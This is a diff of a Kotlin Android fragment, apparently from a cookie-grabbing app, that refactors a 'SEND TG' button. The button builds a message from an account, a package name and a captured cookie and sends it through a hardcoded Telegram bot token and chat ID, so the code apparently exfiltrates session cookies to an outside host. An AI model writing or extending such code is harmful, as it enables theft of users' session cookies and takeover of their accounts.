@@ -126,25 +126,25 @@ class GrabFragment : Fragment() {
             layoutParams = lp
         })
 
-        btnRow.addView(MaterialButton(ctx).apply {
-            text = "SEND TG"
-            textSize = 11f
-            letterSpacing = 0.06f
-            setTextColor(Color.parseColor("#F0F0F0"))
-            setBackgroundColor(Color.parseColor("#E87820"))
-            setOnClickListener {
-                isEnabled = false
-                text = "Sending..."
-                lifecycleScope.launch {
-                    val msg = buildTgMessage(account, pkg, cookie)
-                    val ok = withContext(Dispatchers.IO) {
-                        TelegramHelper.sendMessage(Constants.BOT_TOKEN, Constants.CHAT_ID, msg)
-                    }
-                    text = if (ok) "✓ SENT!" else "❌ GAGAL"
+        val tgBtn = MaterialButton(ctx)
+        tgBtn.text = "SEND TG"
+        tgBtn.textSize = 11f
+        tgBtn.letterSpacing = 0.06f
+        tgBtn.setTextColor(Color.parseColor("#F0F0F0"))
+        tgBtn.setBackgroundColor(Color.parseColor("#E87820"))
+        tgBtn.layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
+        tgBtn.setOnClickListener {
+            tgBtn.isEnabled = false
+            tgBtn.text = "Sending..."
+            lifecycleScope.launch {
+                val msg = buildTgMessage(account, pkg, cookie)
+                val ok = withContext(Dispatchers.IO) {
+                    TelegramHelper.sendMessage(Constants.BOT_TOKEN, Constants.CHAT_ID, msg)
                 }
+                tgBtn.text = if (ok) "✓ SENT!" else "❌ GAGAL"
             }
-            layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
-        })
+        }
+        btnRow.addView(tgBtn)
 
         inner.addView(btnRow)
         card.addView(inner)
